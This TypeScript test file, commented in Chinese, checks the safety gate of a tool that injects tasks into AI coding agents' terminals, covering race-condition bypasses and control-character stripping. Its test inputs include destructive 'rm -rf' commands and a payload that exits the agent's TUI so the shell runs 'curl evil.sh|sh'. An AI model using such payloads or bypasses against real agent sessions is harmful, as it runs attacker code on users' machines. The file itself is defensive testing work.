/**
 * 派活准入的 smoke test —— 这是全项目最危险的一段逻辑：
 * 判错一次就等于把任意文本当命令敲进用户的 shell。
 *
 * 跑法：npm test（Node 原生 type stripping，无需测试框架）
 */
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtemp, writeFile, appendFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { delegate, noteStatus, noteTranscript, isAgentSession, dropNode, assistantText, isShellForeground, sanitizeTask } from '../src/main/delegate.ts'

/** 记录所有注入，便于断言"到底写没写进去" */
function deps(authorize = true): {
  writes: string[]
  d: Parameters<typeof delegate>[0]
} {
  const writes: string[] = []
  return {
    writes,
    d: {
      hasNode: () => true,
      writeToPty: (_id, data) => writes.push(data),
      authorize: async () => authorize
    }
  }
}

test('普通 shell（没有任何 hook 上报）一律拒绝注入', async () => {
  const { writes, d } = deps()
  const r = await delegate(d, 'src', 'shell1', 'rm -rf /tmp/x', 500)
  assert.match(r, /派活被拒/)
  assert.equal(writes.length, 0, '绝不能往未确认的会话里写任何东西')
})

test('SessionEnd 之后迟到的事件不得复活会话', async () => {
  dropNode('n1')
  noteStatus('n1', 'session', 'SessionStart', 's-1')
  assert.equal(isAgentSession('n1'), true)

  noteStatus('n1', 'session', 'SessionEnd', 's-1')
  assert.equal(isAgentSession('n1'), false)

  // 并行 hook 晚到：同一个 session 的 PostToolUse 在 SessionEnd 之后才到
  noteStatus('n1', 'working', 'PostToolUse', 's-1')
  assert.equal(isAgentSession('n1'), false, '迟到事件复活会话 = 往普通 shell 注入')

  const { writes, d } = deps()
  const r = await delegate(d, 'src', 'n1', 'echo hi', 500)
  assert.match(r, /派活被拒/)
  assert.equal(writes.length, 0)
})

/* ── 以下三条是 codex review 实际复现出来的绕过（都真的产生了注入写入），
      作为回归用例钉死。改 delegate 状态机时它们必须一直是绿的。 ── */

test('绕过 1：s1 End → s2 Start → 迟到的 s1 Stop，不得把节点判成可注入', async () => {
  dropNode('b1')
  noteStatus('b1', 'session', 'SessionStart', 's1')
  noteStatus('b1', 'session', 'SessionEnd', 's1')
  noteStatus('b1', 'session', 'SessionStart', 's2')
  noteStatus('b1', 'working', 'PreToolUse', 's2') // s2 正在干活
  noteStatus('b1', 'done', 'Stop', 's1') // 迟到的旧会话 Stop

  const { writes, d } = deps()
  const r = await delegate(d, 'src', 'b1', 'DANGEROUS', 500)
  assert.match(r, /派活被拒/)
  assert.equal(writes.length, 0, '旧会话的迟到 Stop 不能把正在干活的新会话洗成 done')
})

test('绕过 2：dropNode 之后旧会话的迟到事件不得复活节点', async () => {
  dropNode('b2')
  noteStatus('b2', 'session', 'SessionStart', 's1')
  noteStatus('b2', 'done', 'Stop', 's1')
  dropNode('b2') // 节点被删/PTY 结束
  noteStatus('b2', 'done', 'Stop', 's1') // 迟到事件；此时同 id 可能已是普通 shell

  assert.equal(isAgentSession('b2'), false)
  const { writes, d } = deps()
  const r = await delegate(d, 'src', 'b2', 'DANGEROUS', 500)
  assert.match(r, /派活被拒/)
  assert.equal(writes.length, 0)
})

test('绕过 3：无 session_id 时，授权等待期间 End→Start 必须使本次派活作废', async () => {
  dropNode('b3')
  noteStatus('b3', 'session', 'SessionStart')
  noteStatus('b3', 'done', 'Stop')

  const writes: string[] = []
  const d = {
    hasNode: (): boolean => true,
    writeToPty: (_id: string, data: string): void => void writes.push(data),
    // 授权期间目标换了会话
    authorize: async (): Promise<boolean> => {
      noteStatus('b3', 'session', 'SessionEnd')
      noteStatus('b3', 'session', 'SessionStart')
      return true
    }
  }
  const r = await delegate(d, 'src', 'b3', 'DANGEROUS', 500)
  assert.match(r, /换了会话/)
  assert.equal(writes.length, 0, '批准的是旧会话，不能打进新会话')
})

test('新会话可以正常复活', () => {
  dropNode('n2')
  noteStatus('n2', 'session', 'SessionStart', 's-n2')
  noteStatus('n2', 'session', 'SessionEnd', 's-n2')
  assert.equal(isAgentSession('n2'), false)
  noteStatus('n2', 'session', 'SessionStart', 's-n2b')
  assert.equal(isAgentSession('n2'), true)
})

test('非接单状态一律拒绝（fail-closed，不是只拒 working）', async () => {
  for (const state of ['working', 'blocked', 'waiting']) {
    dropNode('n3')
    noteStatus('n3', 'session', 'SessionStart', 's-n3')
    noteStatus('n3', state, 'PreToolUse', 's-n3')
    const { writes, d } = deps()
    const r = await delegate(d, 'src', 'n3', 'ls', 500)
    assert.match(r, /派活被拒/, `${state} 应该被拒`)
    assert.equal(writes.length, 0, `${state} 状态下不该有注入`)
  }
})

test('未授权时不注入', async () => {
  dropNode('n4')
  noteStatus('n4', 'session', 'SessionStart', 's-n4')
  noteStatus('n4', 'done', 'Stop', 's-n4')
  const { writes, d } = deps(false)
  const r = await delegate(d, 'src', 'n4', 'ls', 500)
  assert.match(r, /未获授权/)
  assert.equal(writes.length, 0)
})

test('不能派给自己', async () => {
  const { writes, d } = deps()
  const r = await delegate(d, 'same', 'same', 'ls', 500)
  assert.match(r, /不能派给自己/)
  assert.equal(writes.length, 0)
})

test('空任务拒绝', async () => {
  dropNode('n5')
  noteStatus('n5', 'session', 'SessionStart', 's-n5')
  noteStatus('n5', 'done', 'Stop', 's-n5')
  const { writes, d } = deps()
  const r = await delegate(d, 'src', 'n5', '   ', 500)
  assert.match(r, /任务为空/)
  assert.equal(writes.length, 0)
})

test('放行路径：回答必须是**本轮新写入**的，不能是 transcript 里原有的旧答案', async () => {
  const dir = await mkdtemp(path.join(tmpdir(), 'termscape-test-'))
  const tp = path.join(dir, 'transcript.jsonl')
  /* 这条验的是**放行路径能跑通** + 注入内容原样带一个回车。
     ⚠️ 它**不能**证明"不会返回旧答案"：旧答案写在前面、新答案 append 在后面，
     一个完全忽略 sinceBytes 的实现（读整份、倒着找最后一条 assistant）照样返回新答案。
     真正钉住那条的是下面那个用例（本轮只有 tool_use 没有正文），别以为这条兜着。 */
  const stale = JSON.stringify({
    type: 'assistant',
    message: { content: [{ type: 'text', text: '这是上一轮的旧答案' }] }
  })
  await writeFile(tp, `${JSON.stringify({ type: 'user', message: { content: 'hi' } })}\n${stale}\n`)

  dropNode('n6')
  noteStatus('n6', 'session', 'SessionStart', 's-n6')
  noteStatus('n6', 'done', 'Stop', 's-n6')
  noteTranscript('n6', tp)

  const writes: string[] = []
  const d = {
    hasNode: (): boolean => true,
    writeToPty: (_id: string, data: string): void => {
      writes.push(data)
      // 模拟目标 agent：收到输入 → 开始干活 → 写下本轮回答 → 干完
      noteStatus('n6', 'working', 'UserPromptSubmit', 's-n6')
      setTimeout(() => {
        void appendFile(
          tp,
          `${JSON.stringify({
            type: 'assistant',
            message: { content: [{ type: 'text', text: '本轮的新答案' }] }
          })}\n`
        ).then(() => noteStatus('n6', 'done', 'Stop', 's-n6'))
      }, 1600)
    },
    authorize: async (): Promise<boolean> => true
  }

  const r = await delegate(d, 'src', 'n6', '干活', 20_000)
  assert.equal(writes.length, 1)
  assert.equal(writes[0], '干活\r', '注入内容必须原样带一个回车')
  assert.equal(r, '本轮的新答案')
})

test('目标完成了但本轮没写正文 → 明说"没有新回答"，绝不返回旧答案', async () => {
  const dir = await mkdtemp(path.join(tmpdir(), 'termscape-test-'))
  const tp = path.join(dir, 'transcript.jsonl')
  await writeFile(
    tp,
    `${JSON.stringify({
      type: 'assistant',
      message: { content: [{ type: 'text', text: '几分钟前的旧答案' }] }
    })}\n`
  )
  dropNode('n7')
  noteStatus('n7', 'session', 'SessionStart', 's-n7')
  noteStatus('n7', 'done', 'Stop', 's-n7')
  noteTranscript('n7', tp)

  const d = {
    hasNode: (): boolean => true,
    writeToPty: (): void => {
      noteStatus('n7', 'working', 'UserPromptSubmit', 's-n7')
      // 本轮只调了工具、没有文本正文
      setTimeout(() => {
        void appendFile(
          tp,
          `${JSON.stringify({
            type: 'assistant',
            message: { content: [{ type: 'tool_use', name: 'Bash', input: {} }] }
          })}\n`
        ).then(() => noteStatus('n7', 'done', 'Stop', 's-n7'))
      }, 1600)
    },
    authorize: async (): Promise<boolean> => true
  }
  const r = await delegate(d, 'src', 'n7', '干活', 20_000)
  assert.doesNotMatch(r, /旧答案/, '绝不能把上一轮的回答当成本轮结果')
  assert.match(r, /本轮没有新的文本回答/)
})

test('秒完成的任务不能被判成"不像活跃 agent"', async () => {
  /* 轮询每 1.5s 采样一次 status，一个 1 秒内跑完的任务整段错过 working，
     老实现 12s 后返回"不像活跃 agent 会话"，而它早就做完了。 */
  const dir = await mkdtemp(path.join(tmpdir(), 'termscape-test-'))
  const tp = path.join(dir, 'transcript.jsonl')
  await writeFile(tp, '')
  dropNode('n8')
  noteStatus('n8', 'session', 'SessionStart', 's-n8')
  noteStatus('n8', 'done', 'Stop', 's-n8')
  noteTranscript('n8', tp)

  const d = {
    hasNode: (): boolean => true,
    writeToPty: (): void => {
      // working 和 done 在同一拍内发生，轮询永远看不到 working
      noteStatus('n8', 'working', 'UserPromptSubmit', 's-n8')
      void appendFile(
        tp,
        `${JSON.stringify({
          type: 'assistant',
          message: { content: [{ type: 'text', text: '秒完成' }] }
        })}\n`
      ).then(() => noteStatus('n8', 'done', 'Stop', 's-n8'))
    },
    authorize: async (): Promise<boolean> => true
  }
  const r = await delegate(d, 'src', 'n8', '干活', 20_000)
  assert.equal(r, '秒完成')
})

// ── transcript 解析：两家格式都要认 ─────────────────────────────────────────

test('取回答认得 Claude Code 的 transcript 行', () => {
  const line = JSON.stringify({
    type: 'assistant',
    message: { content: [{ type: 'text', text: '做完了' }] }
  })
  assert.equal(assistantText(line), '做完了')
})

test('取回答认得 codex 的 rollout 行', () => {
  /* 真实形状（取自 ~/.codex/sessions/.../rollout-*.jsonl）。
     只认 Claude 那套时，claude → codex 派活会"注入成功、完成检测成功、
     但取不回答案"—— 半通的链路比不通更难查 */
  const line = JSON.stringify({
    timestamp: '2026-07-27T05:19:43.746Z',
    type: 'response_item',
    payload: {
      type: 'message',
      id: 'msg_0c2',
      role: 'assistant',
      content: [{ type: 'output_text', text: 'codex 干完了' }]
    }
  })
  assert.equal(assistantText(line), 'codex 干完了')
})

test('取回答跳过工具调用块，只要文本', () => {
  const line = JSON.stringify({
    type: 'assistant',
    message: {
      content: [
        { type: 'tool_use', name: 'Bash', input: { command: 'rm -rf /' } },
        { type: 'text', text: '正文' }
      ]
    }
  })
  assert.equal(assistantText(line), '正文')
})

test('取回答对 user 行 / 撕裂行返回空，不误当成答案', () => {
  assert.equal(assistantText(JSON.stringify({ type: 'user', message: { content: '问题' } })), '')
  assert.equal(assistantText('{"type":"assis'), '')
  assert.equal(assistantText(''), '')
  // codex 的非 assistant response_item（工具输出等）也不能当答案
  assert.equal(
    assistantText(JSON.stringify({ type: 'response_item', payload: { type: 'message', role: 'user', content: [] } })),
    ''
  )
})

// ── 注入前的前台进程闸（P0：SessionEnd 丢了就往 shell 里执行任务）─────────────

test('前台是普通 shell 时拒绝注入 —— 一个字都不能写进去', async () => {
  /* 复现路径：agent 退出 → SessionEnd 的 curl 失败（hook 是 fail-open 的）
     → 主进程仍认为 live=true,status=done → 老实现直接把任务写进 pty，
     而 pane 里是 zsh，那一行就是被执行的命令。实测过 `rm -rf …\r` 真的写进去了。 */
  dropNode('sh1')
  noteStatus('sh1', 'session', 'SessionStart', 's-sh1')
  noteStatus('sh1', 'done', 'Stop', 's-sh1')
  const writes: string[] = []
  const r = await delegate(
    {
      hasNode: (): boolean => true,
      writeToPty: (_id: string, d: string): void => {
        writes.push(d)
      },
      foreground: async (): Promise<string> => 'zsh',
      authorize: async (): Promise<boolean> => true
    },
    'src',
    'sh1',
    'rm -rf /tmp/DEMO',
    3000
  )
  assert.equal(writes.length, 0, '被拒时绝不能有任何注入')
  assert.match(r, /普通 shell/)
})

test('查不到前台进程时不一刀切拒（没开 tmux 的用户还要能用）', async () => {
  dropNode('sh2')
  noteStatus('sh2', 'session', 'SessionStart', 's-sh2')
  noteStatus('sh2', 'done', 'Stop', 's-sh2')
  const writes: string[] = []
  await delegate(
    {
      hasNode: (): boolean => true,
      writeToPty: (_id: string, d: string): void => {
        writes.push(d)
      },
      foreground: async (): Promise<string> => '', // 查不到
      authorize: async (): Promise<boolean> => true
    },
    'src',
    'sh2',
    '干活',
    2000
  )
  assert.equal(writes.length, 1)
})

test('认不出的进程名放行（agent 的进程名列不全，别误拦新 CLI）', () => {
  for (const shell of ['zsh', '-zsh', '/bin/bash', 'fish', 'SH']) {
    assert.equal(isShellForeground(shell), true, `${shell} 应判成 shell`)
  }
  for (const agent of ['claude', 'codex', 'node', 'python3', 'bun', 'aider']) {
    assert.equal(isShellForeground(agent), false, `${agent} 不该被当成 shell`)
  }
})

test('绕过 4：授权之后、落笔之前 agent 退出（前台探测那一拍），不得注入', async () => {
  /* 授权复查是在 foreground 探测和 stat **之前**做的。这两步各有一个 await，
     加起来足够 agent 退出：SessionEnd 一到 pane 里就是光秃秃的 shell，
     此时注入 = 直接执行任意命令。这一拍以前是没人看的。 */
  dropNode('b4')
  noteStatus('b4', 'session', 'SessionStart', 's4')
  noteStatus('b4', 'done', 'Stop', 's4')

  const writes: string[] = []
  const r = await delegate(
    {
      hasNode: () => true,
      writeToPty: (_id: string, data: string): void => void writes.push(data),
      // 探测前台进程要跨进程问 tmux —— 就在这一拍里 agent 退了
      foreground: async () => {
        noteStatus('b4', 'session', 'SessionEnd', 's4')
        return 'node' // 探测拿到的是**退出前**的快照，看着还像 agent
      },
      authorize: async () => true
    },
    'src',
    'b4',
    'rm -rf /tmp/DEMO',
    500
  )
  assert.equal(writes.length, 0, `agent 已退出却仍注入了：${JSON.stringify(writes)}`)
  assert.match(r, /最后一刻/)
})

test('绕过 5：授权之后、落笔之前开关被关掉，不得注入', async () => {
  /* 跨机派活的授权是设置里的一个开关。authorize 里查过一次，但那之后还有
     foreground 和 stat 两个 await —— 用户完全可能在这几十毫秒里把开关关掉。
     "安全开关只能往收紧方向失败"要求关掉的那一刻起就不能再有注入。 */
  dropNode('b5')
  noteStatus('b5', 'session', 'SessionStart', 's5')
  noteStatus('b5', 'done', 'Stop', 's5')

  const writes: string[] = []
  let allowed = true
  const r = await delegate(
    {
      hasNode: () => true,
      writeToPty: (_id: string, data: string): void => void writes.push(data),
      foreground: async () => {
        allowed = false // 用户就在这一拍关掉了开关
        return 'node'
      },
      authorize: async () => allowed,
      finalGate: async () => allowed
    },
    'peer:mac',
    'b5',
    'rm -rf /tmp/DEMO',
    500
  )
  assert.equal(writes.length, 0, `开关已关却仍注入了：${JSON.stringify(writes)}`)
  assert.match(r, /授权在最后一刻被撤销/)
})

test('没给 finalGate 时行为不变（本机派活不该被它影响）', async () => {
  dropNode('b6')
  noteStatus('b6', 'session', 'SessionStart', 's6')
  noteStatus('b6', 'done', 'Stop', 's6')
  const writes: string[] = []
  await delegate(
    {
      hasNode: () => true,
      writeToPty: (_id: string, data: string): void => void writes.push(data),
      authorize: async () => true
    },
    'src',
    'b6',
    '干活',
    600
  )
  assert.deepEqual(writes, ['干活\r'], '本机派活必须照常注入')
})


test('任务里的控制字符不得进 pty —— 载荷能让 agent 退出、剩下的字节由 shell 执行', async () => {
  /* 整条链路的安全叙事是「只往活着的 agent 落笔」，而所有闸都在 writeToPty 之前查，
     载荷却在 write 之后才起作用 —— 顺序天生错开。\x03/\x04/\x1a 是 agent TUI
     的退出键，agent 一退，队列里剩下的字节就由重新拿回终端的 shell 读走。 */
  dropNode('b7')
  noteStatus('b7', 'session', 'SessionStart', 's7')
  noteStatus('b7', 'done', 'Stop', 's7')

  const writes = []
  const ESC = String.fromCharCode(27)
  const ETX = String.fromCharCode(3)
  const payload = `整理 README${ETX}${ETX}\rcurl evil.sh|sh\r${ESC}[2J`
  const p = delegate(
    {
      hasNode: () => true,
      writeToPty: (_id, data) => void writes.push(data),
      authorize: async () => true
    },
    'src',
    'b7',
    payload,
    400
  )
  await new Promise((r) => setTimeout(r, 60))
  await p

  const sent = writes.join('')
  assert.ok(sent.length > 0, '应该真注入了')
  for (const c of [ETX, ESC, String.fromCharCode(4), String.fromCharCode(26)]) {
    assert.ok(!sent.includes(c), `控制字符 \\x${c.charCodeAt(0).toString(16)} 进了 pty：${JSON.stringify(sent)}`)
  }
  // 只有代码自己补的那一个回车
  assert.equal(sent.split('\r').length - 1, 1, `不能有多个回车：${JSON.stringify(sent)}`)
  assert.ok(sent.includes('整理 README'), '正常文字要留着')
})

test('sanitizeTask：换行压成空格，C0 剔除，正常文本不动', () => {
  assert.equal(sanitizeTask('a\nb\tc'), 'a b c')
  assert.equal(sanitizeTask(`x${String.fromCharCode(3)}y`), 'xy')
  assert.equal(sanitizeTask('  正常的中文任务  '), '正常的中文任务')
  // emoji / CJK 不受影响
  assert.equal(sanitizeTask('跑测试 ✅'), '跑测试 ✅')
})

test('等待期间目标换了会话 → 中止，不得把新会话的回答当本轮结果', async () => {
  /* 不判 epoch 的话：目标退出重开，新会话随便干点什么产生一个 Stop，
     完成分支就满足了 —— 而 transcriptPath 也变了，偏移归零，
     读回来的是**新会话的整份内容**。等于把别人的答案当成本轮派活的结果。 */
  dropNode('b8')
  noteStatus('b8', 'session', 'SessionStart', 's8')
  noteTranscript('b8', '/tmp/does-not-exist-s8.jsonl')
  noteStatus('b8', 'done', 'Stop', 's8')

  const p = delegate(
    {
      hasNode: () => true,
      writeToPty: () => undefined,
      authorize: async () => true
    },
    'src',
    'b8',
    '干活',
    8000
  )
  // 注入之后、还没答完之前，目标换了会话
  await new Promise((r) => setTimeout(r, 100))
  noteStatus('b8', 'session', 'SessionEnd', 's8')
  noteStatus('b8', 'session', 'SessionStart', 's9')
  noteTranscript('b8', '/tmp/does-not-exist-s9.jsonl') // 新会话 = 新 transcript 文件
  noteStatus('b8', 'working', 'PreToolUse', 's9')
  noteStatus('b8', 'done', 'Stop', 's9') // 新会话自己的一轮

  const r = await p
  assert.match(r, /换了会话/, `应该中止，实际返回：${r}`)
})

test('答完就退出（Stop → SessionEnd）仍要返回本轮答案，不得误判成「换了会话」', async () => {
  /* 这是「判据用 path 不用 epoch」那个选择的互补面。
     `SessionEnd` 自己也推进 epoch，而"答完就退出"是完全正常的一轮 ——
     若用 epoch 判中止，用户明明做完了却会收到「本轮结果不可取，去该终端确认」。
     transcript 路径没变，所以按 path 判就不会误杀。 */
  const dir = await mkdtemp(path.join(tmpdir(), 'termscape-exit-'))
  const tp = path.join(dir, 'transcript.jsonl')
  await writeFile(tp, `${JSON.stringify({ type: 'user', message: { content: 'hi' } })}\n`)

  dropNode('n9')
  noteStatus('n9', 'session', 'SessionStart', 's-n9')
  noteStatus('n9', 'done', 'Stop', 's-n9')
  noteTranscript('n9', tp)

  const r = await delegate(
    {
      hasNode: (): boolean => true,
      writeToPty: (): void => {
        noteStatus('n9', 'working', 'UserPromptSubmit', 's-n9')
        setTimeout(() => {
          void appendFile(
            tp,
            `${JSON.stringify({
              type: 'assistant',
              message: { content: [{ type: 'text', text: '干完了，我退了' }] }
            })}\n`
          ).then(() => {
            noteStatus('n9', 'done', 'Stop', 's-n9')
            // 答完随即退出 —— epoch 会 +1，但这一轮是合法完成的
            noteStatus('n9', 'session', 'SessionEnd', 's-n9')
          })
        }, 60)
      },
      authorize: async () => true
    },
    'src',
    'n9',
    '干活',
    8000
  )
  assert.equal(r, '干完了，我退了', `合法答案被误杀了：${r}`)
})
